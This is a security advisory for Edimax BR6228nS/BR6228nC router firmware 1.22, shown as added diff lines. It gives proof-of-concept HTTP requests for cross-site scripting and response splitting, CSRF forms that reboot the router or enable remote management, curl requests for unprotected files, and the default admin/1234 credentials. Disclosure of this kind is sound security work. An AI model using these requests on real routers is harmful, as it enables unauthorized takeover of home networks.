@@ -1,0 +1,156 @@
+# Title: Edimax BR6228nS/BR6228nC - Multiple vulnerabilities
+# Date: 01.09.15
+# Vendor: edimax.com
+# Firmware version: 1.22
+# Author: Smash_
+# Contact: smash [at] devilteam.pl
+
+Few vulnerabilities found in Edimax BR6228nS/BR6228nC router firmware.
+
+
+1/ Cross Site Scripting
+
+Request:
+POST /goform/formWizSetup HTTP/1.1
+Host: 192.168.0.10:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10:8080/main.asp
+Cookie: language=0
+Authorization: Basic YWRtaW46MTIzNA==
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+setPage=x");alert("X&wizEnabled=1
+
+Response:
+HTTP/1.0 200 OK
+Server: GoAhead-Webs
+
+<html>
+<body class="background" onLoad=document.location.replace("x");alert("X")></html>
+
+
+
+2/ HTTP Response Splitting
+
+Request:
+POST /goform/formReflashClientTbl HTTP/1.1
+Host: 192.168.0.10:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10:8080/stadhcptbl.asp
+Cookie: language=0
+Authorization: Basic YWRtaW46MTIzNA==
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+
+submit-url=%2Fstadhcptbl.asp%0d%0aXXX%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('X')</script>
+
+Response:
+HTTP/1.0 302 Redirect
+Server: GoAhead-Webs
+Date: Fri Nov 16 18:08:51 2012
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Location: http://192.168.0.10:8080/stadhcptbl.asp
+XXX
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<script>alert('X')</script>
+
+
+
+3/ Cross Site Request Forgery
+
+Examples:
+
+<html>
+  <!-- Reboot -->
+  <body>
+    <form action="http://192.168.0.10:8080/goform/formReboot" method="POST">
+      <input type="hidden" name="reset&#95;flag" value="0" />
+      <input type="hidden" name="submit&#45;url" value="&#47;tools&#46;asp" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+  -
+
+<html>
+  <!-- Enable remote access -->
+  <body>
+    <form action="http://192.168.0.10:8080/goform/formReManagementSetup" method="POST">
+      <input type="hidden" name="reManHostAddr" value="0&#46;0&#46;0&#46;0" />
+      <input type="hidden" name="reManPort" value="8080" />
+      <input type="hidden" name="reMangEnable" value="ON" />
+      <input type="hidden" name="submit&#45;url" value="&#47;system&#46;asp" />
+      <input type="hidden" name="" value="" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+ -
+ 
+<html>
+  <!-- XSS -->
+  <body>
+    <form action="http://192.168.0.10:8080/goform/formWizSetup" method="POST">
+      <input type="hidden" name="setPage" value="x"&#41;&#59;alert&#40;"X" />
+      <input type="hidden" name="wizEnabled" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+4/ Unprotected files
+
+Following url's can be requested without http authorisation in order to obtain detail informations about router:
+
+http://192.168.0.10:8080/FUNCTION_SCRIPT
+http://192.168.0.10:8080/main.asp
+
+Example:
+
+devil@hell:~$ curl -ig http://192.168.0.10:8080/
+HTTP/1.1 401 Unauthorized
+Server: GoAhead-Webs
+Date: Fri Nov 16 18:28:39 2012
+WWW-Authenticate: Basic realm="Default: admin/1234"
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+
+devil@hell:~$ curl -ig http://192.168.0.10:8080/FUNCTION_SCRIPT
+HTTP/1.0 200 OK
+Date: Fri Nov 16 18:28:47 2012
+Server: GoAhead-Webs
+Last-modified: Fri Nov 16 09:57:30 2012
+Content-length: 997
+Content-type: text/html
+
+_DATE_="2012.11.16-17:51:47"
+_VERSION_="1.22"
+_MODEL_="BR6228GNS"
+_MODE_="EdimaxOBM"
+_PLATFORM_="RTL8196C_1200"
+_HW_LED_WPS_="4"
+_HW_LED_POWER_="6"
+_HW_LED_WIRELESS_="2"
+_HW_LED_USB_="17"
+_HW_BUTTON_RESET_="5"
+(...)
